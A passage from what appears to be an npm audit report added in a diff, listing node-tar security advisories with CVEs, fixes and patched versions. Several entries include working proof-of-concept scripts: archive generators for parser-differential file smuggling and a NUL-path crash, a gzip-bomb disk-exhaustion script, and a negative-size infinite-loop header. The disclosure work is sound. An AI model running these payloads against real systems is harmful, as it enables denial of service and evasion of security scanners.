affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
+      "reported_by": null,
+      "title": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23950"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.3",
+      "github_advisory_id": "GHSA-r6q2-hw4h-h46w",
+      "recommendation": "Upgrade to version 7.5.4 or later",
+      "patched_versions": ">=7.5.4",
+      "updated": "2026-03-16T14:23:27.000Z",
+      "cvss": {
+        "score": 8.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-176",
+        "CWE-367"
+      ],
+      "url": "https://github.com/advisories/GHSA-r6q2-hw4h-h46w"
+    },
+    "1120782": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-vmf3-w455-68vh\n- https://github.com/advisories/GHSA-vmf3-w455-68vh",
+      "created": "2026-06-15T17:19:42.000Z",
+      "id": 1120782,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`tar` (node-tar) applies a PAX extended header's `size=` record (and other PAX\noverrides) to the **next header entry of any type**, including intermediary\nmetadata headers such as a GNU long-name (`L`) or long-link (`K`) entry. Per\nPOSIX pax, a PAX extended header (`x`) describes the *next file entry*, not the\nintermediary extension headers that may sit between the `x` header and the file\nit annotates. Because node-tar lets the PAX `size` override the byte length of\nan intervening `L`/`K`/`x` header, an attacker can desynchronize node-tar's\nstream cursor relative to every other mainstream tar implementation\n(GNU tar, libarchive/bsdtar, Python `tarfile`, and the now-fixed `tar-rs` /\n`astral-tokio-tar`).\n\nThe result is a tar parser **interpretation differential** (CWE-436): a single\ncrafted archive yields a different set of members under node-tar than under the\nreference tar tools. An attacker can use this to hide a member from one parser\nwhile it is visible to another, which defeats security tooling whose scanner and\nextractor disagree on archive contents (e.g. a malware/secret scanner that lists\nentries with one library while a downstream step extracts with another). node-tar\nis one of the most widely deployed JavaScript tar libraries (it backs `npm`'s own\npackage-tarball handling and is a transitive dependency of a very large fraction\nof the npm ecosystem), so the blast radius for \"files that extract differently\ndepending on the tool\" is broad.\n\nThis is the same root cause and fix that was just addressed upstream in the Rust\ntar ecosystem (`tar-rs` / `astral-tokio-tar`); node-tar carries the equivalent\ndefect and has no equivalent guard.\n\n### Impact\n\n- CWE-436 Interpretation Conflict / inconsistent tar parsing (the same class as\n  the prior tar \"smuggling\" advisories GHSA-j5gw-2vrg-8fgx and\n  GHSA-fp55-jw48-c537).\n- A crafted archive can present one logical member list to a tool that lists or\n  scans with node-tar and a different member list to GNU tar / libarchive /\n  Python tarfile (and vice versa). This lets a malicious file be hidden from a\n  scanner that uses a different parser than the eventual extractor, or hidden\n  from node-tar-based inspection while still landing on disk via a system `tar`.\n- No authentication is required; the only precondition is that a victim parses\n  an attacker-supplied tar with node-tar. Tar archives are routinely fetched\n  from untrusted sources (package registries, user uploads, CI artifacts,\n  container layers).\n- Severity: Medium. Impact is integrity-of-archive-interpretation, not direct\n  RCE; it is a building block for supply-chain / scanner-evasion attacks rather\n  than a standalone code-execution primitive.\n\n### Vulnerable code (file:line)\n\n`src/header.ts` (compiled to `dist/esm/header.js:49` and\n`dist/commonjs/header.js:85` in the published `tar@7.5.15`):\n\n```ts\n// Header.decode(buf, off, ex, gex)\nthis.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12)\n```\n\n`ex` is the currently-accumulated PAX **local** extended header and `gex` the\nPAX **global** header. The `size` override from `ex`/`gex` is applied\nunconditionally to whatever header is being decoded next — there is no check\nthat the header being decoded is a real *file* entry rather than an intermediary\nextension header.\n\n`src/parse.ts`, `[CONSUMEHEADER]` constructs the next header with the current\n`EX`/`GEX` applied:\n\n```ts\nconst header = new Header(chunk, position, this[EX], this[GEX])\n```\n\nand later branches on whether that header is a metadata entry. `this[EX]` is\ncleared only in the non-meta (real file) branch:\n\n```ts\nif (entry.meta) {\n  // L / K / x / g metadata entries: this[EX] is left intact here\n  if (entry.size > this.maxMetaEntrySize) {\n    entry.ignore = true\n    this[STATE] = 'ignore'\n    entry.resume()\n  } else if (entry.size > 0) {\n    this[META] = ''\n    entry.on('data', c => (this[META] += c))\n    this[STATE] = 'meta'\n  }\n} else {\n  this[EX] = undefined   // EX cleared only once a real file entry is reached\n}\n```\n\nWhen the stream is ordered `x (PAX, size=N) -> L (GNU long-name) -> file`, the\n`L` header is constructed with `this[EX]` still set, so its `size`/`remain`\nbecomes `N` instead of the `L` payload's true length. node-tar then consumes `N`\nbytes of \"metadata\" and resumes header parsing at the wrong offset, landing\nmid-stream. Every other mainstream parser applies the PAX `size` only to the\nfollowing *file* entry, so they stay synchronized.\n\nThe correct behavior (and the fix shipped upstream in the Rust tar ecosystem) is\nto **not** apply PAX `size`/overrides when the entry being decoded is itself an\nextension header (`L` GNU long-name, `K` GNU long-link, `x` PAX local, `g` PAX\nglobal).\n\n### How input reaches the sink\n\n`tar.list()`, `tar.extract()`/`tar.x()`, and `tar.Parse`/`tar.Unpack` all route\nevery 512-byte header block through `Header.decode(...)` with the\ncurrently-accumulated `EX`/`GEX`. Any consumer that parses an attacker-supplied\narchive — `tar.list`, `tar.extract`, or piping into the streaming `Parser` —\nreaches the sink. No options need to be enabled; the default code path is\naffected.\n\n### Proof of concept\n\nArchive layout (all standard, GNU-tar-producible blocks):\n\n```\nblock 0 : x  header  (PAX local extended, typeflag 'x'), its own size = len(pax body)\nblock 1 : x  payload : the single PAX record  \"...size=2048\\n\"\nblock 2 : L  header  (GNU long-name '././@LongLink'), real size = 13\nblock 3 : L  payload : \"longname.txt\\0\"      (the long name for the next file)\nblock 4 : file header 'file_a', size = 16\nblock 5 : file_a body (16 bytes, zero-padded to 512)\nblock 6 : file header 'file_b', size = 16\nblock 7 : file_b body (16 bytes, zero-padded to 512)\n```\n\nGenerator (`make_tar.py`, pure stdlib, no external deps):\n\n```python\ndef hdr(name, size, typeflag):\n    h = bytearray(512); name = name[:100]; h[0:len(name)] = name\n    h[100:108] = b'0000644\\0'; h[108:116] = b'0000000\\0'; h[116:124] = b'0000000\\0'\n    h[124:136] = ('%011o\\0' % size).encode(); h[136:148] = b'00000000000\\0'\n    h[156:157] = typeflag; h[257:263] = b'ustar\\0'; h[263:265] = b'00'\n    h[148:156] = b' ' * 8\n    cs = sum(h); h[148:156] = ('%06o\\0 ' % cs).encode()\n    return bytes(h)\n\ndef pad(d):\n    return d + b'\\0' * ((512 - len(d) % 512) % 512)\n\ndef pax_record(key, val):              # length-prefixed PAX record \"LEN key=val\\n\"\n    body = b' %s=%s\\n' % (key.encode(), str(val).encode()); n = len(body)\n    while True:\n        s = str(n).encode() + body\n        if len(s) == n: break\n        n = len(s)\n    return s\n\npax = pax_record('size', 2048)         # malicious: claim size=2048 for the \"next\" entry\nout  = hdr(b'PaxHeaders/x', len(pax), b'x') + pad(pax)\nout += hdr(b'././@LongLink', 13, b'L') + pad(b'longname.txt\\0')\nout += hdr(b'file_a', 16, b'0')        + pad(b'AAAA_file_a_body')\nout += hdr(b'file_b', 16, b'0')        + pad(b'BBBB_file_b_body')\nout += b'\\0' * 1024\nopen('pax-desync.tar', 'wb').write(out)\n```\n\nA negative-control archive is identical except the PAX record is\n`pax_record('comment', 'x')` (no `size=`), written to `pax-control.tar`.\n\n### End-to-end reproduction (against pinned version `tar@7.5.15`, latest release)\n\nInstall the published package into a clean project and parse both archives:\n\n```\n$ npm init -y >/dev/null && npm install tar@7.5.15\n$ node -e \"console.log(require('tar/package.json').version)\"\n7.5.15\n$ grep -n \"ex?.size ?? gex?.size\" node_modules/tar/dist/esm/header.js\n49:        this.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12);\n```\n\n`e2e.mjs`:\n\n```js\nimport * as tar from 'tar'\nasync function listEntries(f){\n  const got=[], warns=[]\n  await tar.list({ file:f, onReadEntry:e=>{ got.push({path:e.path,size:e.size,type:e.type}); e.resume() },\n                   onwarn:(code,_msg)=>warns.push(code) })\n  return { got, warns }\n}\nconst mal = await listEntries('pax-desync.tar')\nconsole.log('MALICIOUS entries :', JSON.stringify(mal.got), 'warnings:', JSON.stringify(mal.warns))\nconst ctl = await listEntries('pax-control.tar')\nconsole.log('CONTROL  entries :', JSON.stringify(ctl.got), 'warnings:', JSON.stringify(ctl.warns))\n```\n\nVerbatim output:\n\n```\n=== Deployed-consumer E2E: npm tar@7.5.15 (latest release) ===\n\n[MALICIOUS] archive = x(PAX size=2048) -> L(GNU longname \"longname.txt\") -> file_a(16B) -> file_b(16B)\n  tar.list() entries : []\n  tar.list() warnings: [\"TAR_ENTRY_INVALID\"]\n\n[NEGATIVE CONTROL] same archive, PAX record is \"comment=x\" (no size= override)\n  tar.list() entries : [{\"path\":\"longname.txt\",\"size\":16,\"type\":\"File\"},{\"path\":\"file_b\",\"size\":16,\"type\":\"File\"}]\n  tar.list() warnings: []\n```\n\nReference parsers on the **same** `pax-desync.tar`:\n\n```\n$ tar tvf pax-desync.tar\n-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # GNU tar\n\n$ bsdtar tvf pax-desync.tar\n-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # libarchive\n\n$ python3 -c \"import tarfile; print([m.name for m in tarfile.open('pax-desync.tar').getmembers()])\"\n['longname.txt']                                                      # Python tarfile\n```\n\nInterpretation differential: GNU tar, libarchive (bsdtar), and Python `tarfile`\nall extract the member `longname.txt` from `pax-desync.tar`, whereas node-tar\n`7.5.15` desynchronizes, raises `TAR_ENTRY_INVALID` (checksum failure from\nlanding mid-stream), and reports **zero** members. The negative control proves\nthe divergence is caused solely by the PAX `size=` override being applied to the\nintermediary `L` header — when the same archive carries a PAX record without\n`size=`, node-tar parses it identically to the reference tools\n(`longname.txt`, `file_b`).\n\n### Suggested fix\n\nWhen decoding a header, do not apply PAX `size` (or other PAX overrides) if the\nheader being decoded is itself an extension header. Concretely, in\n`src/parse.ts` clear/ignore `this[EX]` (and `this[GEX]` for `size`) when the\nheader's type is `ExtendedHeader`, `GlobalExtendedHeader`, `NextFileHasLongPath`\n(GNU `L`), or `NextFileHasLongLinkpath` (GNU `K`); equivalently, in\n`Header.decode`, gate the `ex?.size ?? gex?.size` override on the decoded type\nnot being one of those extension types. This mirrors the upstream Rust fix,\nwhich guards `pax_size` with\n`is_gnu_longname || is_gnu_longlink || is_pax_local_extensions || is_pax_global_extensions`.\n\nA fix PR is being prepared against a private fork and will be linked here.\n\n### Fix PR\n\nTo be linked from a private fork of the repository (the fix will not be pushed\nto any public fork or to upstream during embargo).\n\n### Credits\n\nReported by tonghuaroot.",
+      "reported_by": null,
+      "title": "node-tar applies PAX size override to intermediary GNU long-name/long-link headers, causing tar parser interpretation differential (file smuggling)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53655"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.15",
+      "github_advisory_id": "GHSA-vmf3-w455-68vh",
+      "recommendation": "Upgrade to version 7.5.16 or later",
+      "patched_versions": ">=7.5.16",
+      "updated": "2026-06-15T17:19:44.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-vmf3-w455-68vh"
+    },
+    "1123939": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-w8wr-v893-vjvp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59871\n- https://github.com/isaacs/node-tar/commit/e02a4e9e013c4be95302e2eb2047a942b883c27b\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.18\n- https://github.com/advisories/GHSA-w8wr-v893-vjvp",
+      "created": "2026-07-20T21:53:14.000Z",
+      "id": 1123939,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA crafted 2.5KB tar archive crashes any Node.js process that extracts it. The PAX header parser coerces all-digit path values to JavaScript numbers, which causes an uncaught TypeError when downstream code calls `.split('/')` on the numeric value. Error handlers and `strict: false` cannot intercept the crash.\n\n### Details\n\nIn `pax.ts` line 180, `parseKV` converts PAX values matching `/^[0-9]+$/` to numbers via `+v`. This applies to all fields including `path` and `linkpath`. When a PAX header sets `path` to an all-digit string like `\"12345\"`, the value becomes the number `12345`.\n\nThis number flows through Header -> ReadEntry -> Unpack.CHECKPATH, where `normalizeWindowsPath(entry.path).split('/')` throws a TypeError because numbers don't have `.split()`.\n\nThe throw is synchronous during event emission and bypasses all error handling:\n- `strict: false` does not help\n- `'error'` event handlers do not catch it\n- `'warn'` handlers do not catch it\n- The TypeError propagates through the event emitter stack as an uncaughtException\n\nDirectory, SymbolicLink, and Link type entries reach CHECKPATH and crash. File type entries crash earlier in Header constructor at `this.path.slice(-1)`, but that throw is caught and emitted as a warning only.\n\n### PoC\n\nCreate a tar archive with a PAX extended header containing an all-digit path:\n\n```\nPAX header body: \"18 path=12345\\n\"\nEntry type: Directory (type '5')\n```\n\nExtract it:\n```js\nconst tar = require('tar');\n\n// All of these crash with TypeError: t.split is not a function\ntar.extract({ file: 'malicious.tar', cwd: '/tmp/test' });\n\n// Error handlers don't help:\ntar.extract({ file: 'malicious.tar', cwd: '/tmp/test', strict: false })\n  .on('error', (err) => { /* never reached */ })\n  .on('warn', (code, msg) => { /* never reached */ });\n```\n\nThe archive is ~2.5KB. The crash is deterministic on every attempt.\n\n### Impact\n\nDenial of service. Any application or tool that extracts untrusted tar archives crashes from a single small file. This includes npm (which uses node-tar to extract packages), CI/CD pipelines, file upload processors, and backup tools. The crash cannot be caught by application-level error handling.",
+      "reported_by": null,
+      "title": "node-tar: Process crash via PAX numeric path type confusion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59871"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.17",
+      "github_advisory_id": "GHSA-w8wr-v893-vjvp",
+      "recommendation": "Upgrade to version 7.5.18 or later",
+      "patched_versions": ">=7.5.18",
+      "updated": "2026-07-20T21:53:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-704"
+      ],
+      "url": "https://github.com/advisories/GHSA-w8wr-v893-vjvp"
+    },
+    "1123940": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-23hp-3jrh-7fpw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59873\n- https://github.com/isaacs/node-tar/commit/2812e9338665659b183aa7226518c307044957d3\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.19\n- https://github.com/advisories/GHSA-23hp-3jrh-7fpw",
+      "created": "2026-07-20T21:52:03.000Z",
+      "id": 1123940,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted \"Gzip Bomb\" can be used to fill a server's storage and crash services.\n\n### Details\nThe `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.\n\nSpecifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.\n\n### PoC\nThe following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.\n\n1. Create the exploit script:\n```javascript\nconst fs = require('fs'), z = require('zlib'), t = require('tar');\n\nconst d = 'dos_test';\nif (fs.existsSync(d)) fs.rmSync(d, {recursive:true});\nfs.mkdirSync(d);\n\n// Build 10GB header\nconst h = Buffer.alloc(512);\nh.write('payload');\nh.write((10*1024**3).toString(8).padStart(11,'0'), 124); \nh.write('ustar', 257);\nlet s = 256;\nfor(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];\nh.write(s.toString(8).padStart(6,'0'), 148);\n\nconst gz = z.createGzip();\ngz.pipe(t.x({cwd: d}));\ngz.write(h);\n\nconst b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed\n\nconst run = () => {\n  while (gz.write(b));\n  gz.once('drain', run);\n};\n\nconst monitor = setInterval(() => {\n    try {\n        const bytes = fs.statSync(`${d}/payload`).size;\n        const mb = Math.floor(bytes / (1024 * 1024));\n        process.stdout.write(`\\r[>] Extracted: ${mb} MB`);\n        \n        if (mb > 5000) { \n            console.log('\\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); \n            process.exit(); \n        }\n    } catch {}\n}, 50);\n\nprocess.on('exit', () => {\n    clearInterval(monitor);\n    console.log('[*] Cleaning up...');\n    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});\n});\n\nrun();\n```\n\n2. Run the PoC:\n```bash\nnode poc.js\n```\n\n**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being \"sent\" through the gzip stream is negligible.\n\n### Impact\nThis is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.",
+      "reported_by": null,
+      "title": "node-tar: Decompression/parse DoS via unlimited input",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59873"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.18",
+      "github_advisory_id": "GHSA-23hp-3jrh-7fpw",
+      "recommendation": "Upgrade to version 7.5.19 or later",
+      "patched_versions": ">=7.5.19",
+      "updated": "2026-07-20T21:52:04.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-23hp-3jrh-7fpw"
+    },
+    "1123941": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8x88-c5mf-7j5w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59874\n- https://github.com/isaacs/node-tar/commit/9e78bf058b2c22dd4d52e00d8922d5c06fc2f7b5\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.18\n- https://github.com/advisories/GHSA-8x88-c5mf-7j5w",
+      "created": "2026-07-20T21:51:39.000Z",
+      "id": 1123941,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nA checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.\n\n### Details\n\nThe public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.\n\nTar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.\n\nFor a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.\n\nThis is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.\n\n### PoC\n\nSave as `poc.mjs` in a project with the vulnerable package installed and run:\n\n```bash\nnode poc.mjs\n```\n\n```js\nimport fs from 'node:fs'\nimport os from 'node:os'\nimport path from 'node:path'\nimport { spawnSync } from 'node:child_process'\n\nconst oct = (b, n, off, len) =>\n  b.write(n.toString(8).padStart(len - 1, '0') + '\\0', off, len, 'ascii')\n\nconst badHeader = () => {\n  const h = Buffer.alloc(512)\n\n  h.write('x', 0)\n  oct(h, 0o644, 100, 8)\n  oct(h, 0, 108, 8)\n  oct(h, 0, 116, 8)\n\n  // base-256 encoded -512 in the size field\n  Buffer.alloc(10, 0xff).copy(h, 124)\n  h[134] = 0xfe\n  h[135] = 0x00\n\n  oct(h, 0, 136, 12)\n  h.fill(0x20, 148, 156)\n  h[156] = 0x30\n  h.write('ustar\\0' + '00', 257, 8, 'binary')\n\n  let sum = 0\n  for (const c of h) sum += c\n  h.write(sum.toString(8).padStart(6, '0') + '\\0 ', 148, 8, 'ascii')\n\n  return h\n}\n\nconst dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tar-loop-'))\nconst file = path.join(dir, 'poc.tar')\n\nfs.writeFileSync(file, badHeader())\nfs.writeFileSync(path.join(dir, 'add.txt'), 'x')\n\nconst r = spawnSync(\n  process.execPath,\n  [\n    '--input-type=module',\n    '-e',\n    `\n      import * as tar from 'tar'\n      tar.replace({ file: ${JSON.stringify(file)}, cwd: ${JSON.stringify(dir)}, sync: true }, ['add.txt'])\n      console.log('completed')\n    `,\n  ],\n  { timeout: 20_000 }\n)\n\nconsole.log(r.error?.code === 'ETIMEDOUT')\n\n// Output: true\n```\n\n### Impact\n\nAn application that calls `tar.replace()` on an existing archive supplied or controlled by an attacker can be forced into a non-terminating archive scan. This can consume a worker process indefinitely and cause denial of service. Plain extraction-only workflows are not affected by this finding.",
+      "reported_by": null,
+      "title": "node-tar: Negative tar entry size causes infinite loop in archive replace",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59874"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.17",
+      "github_advisory_id": "GHSA-8x88-c5mf-7j5w",
+      "recommendation": "Upgrade to version 7.5.18 or later",
+      "patched_versions": ">=7.5.18",
+      "updated": "2026-07-20T21:51:39.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-8x88-c5mf-7j5w"
+    },
+    "1123942": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            ". > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-gvwx-54wh-qm9j\n- https://nvd.nist.gov/vuln/detail/CVE-2026-59875\n- https://github.com/isaacs/node-tar/commit/7a635c29f5edbf083557374d43984273ecfed5b3\n- https://github.com/isaacs/node-tar/releases/tag/v7.5.17\n- https://github.com/advisories/GHSA-gvwx-54wh-qm9j",
+      "created": "2026-07-20T21:51:12.000Z",
+      "id": 1123942,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`node-tar` strips trailing `NUL` bytes from long-name (`L`) and long-linkpath (`K`) GNU extended headers but does **not** apply the same sanitization to equivalent fields delivered via PAX (`x` typeflag) extended headers. A PAX record of the form `path=visible.txt\\x00hidden.txt` is parsed verbatim into `entry.path` and flows into `fs.lstat()` / `fs.open()`, which Node.js core rejects with `ERR_INVALID_ARG_VALUE`. The throw originates inside an `FSReqCallback` async chain that is **not** wrapped by the consumer's `await/try-catch` around `tar.x()` — it surfaces as `uncaughtException` and terminates the process.\n\nThis is a remote denial-of-service primitive against any process that extracts attacker-supplied tarballs through `tar.x` / `tar.extract` / `tar.t` / `tar.Parser`, even when the consumer follows the documented `try/catch` error-handling pattern.\n\nA secondary parser-differential (CWE-436) exists because `tar(1)`, `bsdtar`, and Python `tarfile` truncate the path at the first `NUL` (yielding `visible.txt`) while node-tar retains the full string. A validator that pre-scans a tarball with one tool and extracts with the other is bypassed.\n\n---\n\n## Root cause\n\n### Vulnerable sink — `src/pax.ts:157-183`\n\nPAX KV records flow through `parseKVLine`. The value half (`v`) is assigned directly to the result object with no sanitization for embedded NUL bytes:\n\n```ts\n// src/pax.ts:157\nconst parseKVLine = (set: Record<string, unknown>, line: string) => {\n  const n = parseInt(line, 10)\n  if (n !== Buffer.byteLength(line) + 1) return set\n  line = line.slice((n + ' ').length)\n  const kv = line.split('=')\n  const r = kv.shift()\n  if (!r) return set\n  const k = r.replace(/^SCHILY\\.(dev|ino|nlink)/, '$1')\n  const v = kv.join('=')                                 // <-- NO NUL STRIP\n  set[k] =\n    /^([A-Z]+\\.)?([mac]|birth|creation)time$/.test(k) ?\n      new Date(Number(v) * 1000)\n    : /^[0-9]+$/.test(v) ? +v\n    : v                                                  // <-- v with NULs lands here\n  return set\n}\n```\n\nThe PAX record body is length-prefixed, so the parser knows the exact byte boundary — but it never checks whether the value half between `=` and `\\n` contains `NUL`. The result is consumed by `Header` / `ReadEntry`, where `entry.path` and `entry.linkpath` carry the embedded NUL all the way to `fs.lstat()`.\n\n### Correctly-patched cousin sink — `src/parse.ts:375-388`\n\nThe equivalent code path for GNU L/K long-headers **does** strip NUL bytes:\n\n```ts\n// src/parse.ts:375\ncase 'NextFileHasLongPath':\ncase 'OldGnuLongPath': {\n  const ex = this[EX] ?? Object.create(null)\n  this[EX] = ex\n  ex.path = this[META].replace(/\\0.*/, '')               // <-- NUL strip applied\n  break\n}\ncase 'NextFileHasLongLinkpath': {\n  const ex = this[EX] || Object.create(null)\n  this[EX] = ex\n  ex.linkpath = this[META].replace(/\\0.*/, '')           // <-- NUL strip applied\n  break\n}\n```\n\nThe `parse.ts` fix is the maintainer's own acknowledgement that path strings on this codepath must be NUL-stripped before reaching `fs.*`. The PAX path produces the identical primitive but bypasses the guard.\n\n### Downstream blast radius\n\n`entry.path` and `entry.linkpath` are consumed in:\n- `src/unpack.ts` → `fs.lstat`, `fs.open`, `fs.symlink`, `fs.link`, `fs.mkdir`\n- `src/list.ts` (no crash — listing tolerates NUL in strings)\n- Any consumer of the `ReadEntry` event that calls `path.join()` / `fs.*` on `entry.path`\n\nThe crash fires inside the FSReqCallback Node-internal async machinery, **outside** the user's `await tar.x(...)` Promise rejection boundary.\n\n---\n\n## Proof of Concept\n\n### Artifacts\n- `poc-null-byte-crash.tar` — 3072 bytes — PAX `path=visible.txt\\x00hidden.txt`\n- `poc-null-linkpath-crash.tar` — 2560 bytes — PAX `linkpath=target\\x00garbage` (symlink target sink)\n- `poc1-pax-prefix.py` — minimal PAX-header builder (Python 3, no deps)\n\n### Tarball generator (minimal repro — Python 3)\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal PAX-NUL-injection tarball generator for node-tar PoC.\"\"\"\nimport os\n\ndef cksum(b):\n    s = 0\n    for i, x in enumerate(b):\n        s += 0x20 if 148 <= i < 156 else x\n    return s\n\ndef pad512(buf):\n    rem = len(buf) % 512\n    return buf + b'\\0' * (512 - rem) if rem else buf\n\ndef hdr(name, size, typeflag, prefix=b'', linkpath=b''):\n    b = bytearray(512)\n    b[0:len(name[:100])] = name[:100]\n    b[100:108] = b'0000644\\0'\n    b[108:116] = b'0001000\\0'\n    b[116:124] = b'0001000\\0'\n    b[124:136] = ('%011o ' % size).encode()\n    b[136:148] = ('%011o ' % 0).encode()\n    b[148:156] = b'        '\n    b[156:157] = typeflag\n    b[157:157+len(linkpath[:100])] = linkpath[:100]\n    b[257:265] = b'ustar\\x0000'\n    b[265:270] = b'root\\0'\n    b[297:302] = b'root\\0'\n    b[329:337] = b'0000000\\0'\n    b[337:345] = b'0000000\\0'\n    b[345:345+len(prefix[:155])] = prefix[:155]\n    s = cksum(b)\n    b[148:156] = ('%06o\\0 ' % s).encode()\n    return bytes(b)\n\ndef pax(records):\n    body = b''\n    for k, v in records:\n        kv = b' ' + k + b'=' + v + b'\\n'\n        for digits in range(1, 8):\n            total = digits + len(kv)\n            if len(str(total)) == digits:\n                break\n        body += str(total).encode() + kv\n    return pad512(hdr(b'PaxHeader/poc', len(body), b'x') + body)\n\nout  = pax([(b'path', b'visible.txt\\x00hidden.txt')])  # NUL in PAX path\nout += hdr(b'placeholder', 1, b'0')\nout += pad512(b'A')\nout += b'\\0' * 1024  # end-of-archive\n\nopen('poc.tar', 'wb').write(out)\n```\n\n### Reproduction\n\n```bash\n# 1. Generate tarball\npython3 poc1-pax-prefix.py          # writes poc.tar (3 KB)\n\n# 2. Install vulnerable version\nmkdir repro && cd repro\nnpm init -y && npm 